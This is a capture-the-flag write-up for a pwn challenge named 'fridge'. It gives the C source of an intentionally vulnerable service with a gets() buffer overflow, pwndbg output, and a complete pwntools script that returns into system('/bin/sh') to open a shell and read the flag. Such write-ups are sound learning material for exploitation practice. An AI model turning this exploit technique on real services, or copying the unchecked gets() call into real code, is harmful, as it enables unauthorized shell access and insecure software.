# fridge

We've had a data breach! Our forensics team worked out that there was some weird traffic coming from our new smart refrigerator, and they seem to have found an old debugging service that it's still running...

It's up to you now to work out how they got access to our fridge!

## Solution
We are given the following source code.
```c
#include <stdio.h>
#include <stdlib.h>

const char* config_filepath = "config.txt";

const char* open_message =
    "---------FridgeNet---------\n"
    "FridgeNet v0.3.7\n"
    "\n"
    "Changelog:\n"
    "- Fixed typo in welcome message\n"
    "- Fixed issue that allowed bad actors to get /bin/sh";

const char* options_message =
    "\n\nType:\n"
    "\t1\tDisplay fridge contents\n"
    "\t2\tSet fridge welcome message\n"
    "\t3\tExit\n";

void print_food() {
    puts("Food currently in fridge:");
    system("ls -m food_dir");
}

void set_welcome_message() {
    char buf[32];
    puts("New welcome message (up to 32 chars):");

    gets(buf);

    FILE* conf = fopen(config_filepath, "w");

    if (conf == NULL) {
        puts("Unable to open config file."); // This shouldn't happen
        exit(1);
    }

    fprintf(conf, "welcome_msg: %s", buf);
    fclose(conf);
}

int main() {
    puts(open_message);

    while (1) {
        puts(options_message);
        printf("> ");
        fflush(stdout);

        char choice = getchar();
        while (getchar() != '\n');

        switch (choice) {
            case '1':
                print_food();
                break;
            case '2':
                set_welcome_message();
                break;
            case '3':
                puts("Bye!");
                return 0;
            default:
                puts("Invalid option.");
                break;
        }
    }


    return 0;
}
```

There's a `gets` in `set_welcome_message` so looks like we have a buffer overflow.

Opening the binary in `pwndbg` we can quickly peek at `set_welcome_message` and set a breakpoint at the `ret`.
```asm
pwndbg vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)

pwndbg> disass set_welcome_message 
Dump of assembler code for function set_welcome_message:
   0x08049222 <+0>:	push   ebp
   0x08049223 <+1>:	mov    ebp,esp
   [...]
   0x0804924c <+42>:	push   eax
   0x0804924d <+43>:	call   0x8049060 <gets@plt>
   0x08049252 <+48>:	add    esp,0x10
   [...]
   0x080492be <+156>:	leave
   0x080492bf <+157>:	ret
End of assembler dump.
pwndbg> b *set_welcome_message+157
Breakpoint 1 at 0x80492bf
```

Chucking in a cyclic string and seeing where the `ret` is trying to return to we find that the following payload can control the return pointer.
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa<32 bit address>
```
The changelog has a `/bin/sh` at the end of it. The address of the first `/` is `0x804a09a`, so we have a `/bin/sh` string literal at `0x804a09a`.

`print_food` has a `system()` call in it, so we will jump to this with the address of `/bin/sh` as the next item on the stack (x86 has arguments stored on the stack) to pop a shell.

Grabbing the address of the `system()` call from `pwndbg` we have the following payload

```py
# padding to return pointer
payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa"
payload += p32(0x08049214)      # location of system() call
# in i386 arguments are stored on the stack
payload += p32(0x804a09a)       # location of "/bin/sh" string
```

Now we send it off to get a shell and grab the flag.

> `solve.py`
```py
from pwn import *

# padding to return pointer
payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa"
payload += p32(0x08049214)      # location of system() call
# in i386 arguments are stored on the stack
payload += p32(0x804a09a)       # location of "/bin/sh" string

p = remote("localhost", 1358)   # im running it locally while testing this

print(p.recvuntil(b"> "))
p.sendline(b"2")
print(p.recvuntil(b":\n"))
p.sendline(payload)

p.interactive()
```

> Running exploit

```bash
$ python3 solve.py
[+] Opening connection to localhost on port 1358: Done
b'---------FridgeNet---------\nFridgeNet v0.3.7\n\nChangelog:\n- Fixed typo in welcome message\n- Fixed issue that allowed bad actors to get /bin/sh\n\n\nType:\n\t1\tDisplay fridge contents\n\t2\tSet fridge welcome message\n\t3\tExit\n\n> '
b'New welcome message (up to 32 chars):\n'
[*] Switching to interactive mode
$ ls
config.txt  flag.txt  food_dir	vuln
$ cat flag.txt
pecan{4_ch1ll1ng_d1sc0v3ry!}
```
